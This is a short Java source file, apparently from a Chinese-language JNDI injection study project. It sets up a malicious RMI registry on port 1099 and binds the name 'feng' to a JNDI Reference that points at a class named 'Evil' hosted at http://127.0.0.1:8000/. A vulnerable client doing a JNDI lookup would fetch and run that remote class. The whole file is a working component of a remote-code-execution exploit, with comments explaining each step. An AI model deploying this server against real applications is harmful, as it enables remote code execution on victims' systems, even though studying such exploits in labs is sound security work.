package JNDI.低版本.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception{
        //设置RMI远程对象通信的IP地址
        //System.setProperty("java.rmi.server.hostname","127.0.0.1");
        Registry registry = LocateRegistry.createRegistry(1099);
        //构造一个Reference对象，Evil为指定的类名，http://127.0.0.1/为远程查找地址
        Reference feng = new Reference("1","Evil","http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(feng);
        //注册中心绑定feng这个名字绑定到referenceWrapper这个对象
        registry.bind("feng",referenceWrapper);
    }
}